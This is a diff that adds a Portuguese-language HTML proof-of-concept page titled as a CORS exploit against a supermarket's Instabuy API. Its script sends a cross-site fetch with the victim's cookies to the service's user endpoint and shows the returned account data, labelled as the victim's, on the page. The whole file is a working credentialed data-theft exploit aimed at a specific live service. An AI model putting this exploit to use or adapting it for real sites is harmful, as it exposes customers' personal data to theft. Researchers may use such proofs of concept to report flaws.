@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <title>PoC CORS Instabuy</title>
+</head>
+<body>
+  <h1>PoC CORS Exploit - Supermercado Índio</h1>
+  <pre id="output">Aguardando resposta...</pre>
+
+  <script>
+    // Faz fetch para a API com credenciais (cookies/session) da vítima
+    fetch('https://api.instabuy.com.br/apiv3/user', {
+      method: 'GET',
+      credentials: 'include' // envia cookies mesmo cross-site
+    })
+    .then(response => {
+      if (!response.ok) throw new Error('Falha na requisição');
+      return response.json();
+    })
+    .then(data => {
+      document.getElementById('output').textContent = JSON.stringify(data, null, 2);
+      console.log('Dados da vítima:', data);
+    })
+    .catch(error => {
+      document.getElementById('output').textContent = 'Erro: ' + error.message;
+      console.error(error);
+    });
+  </script>
+</body>
+</html>
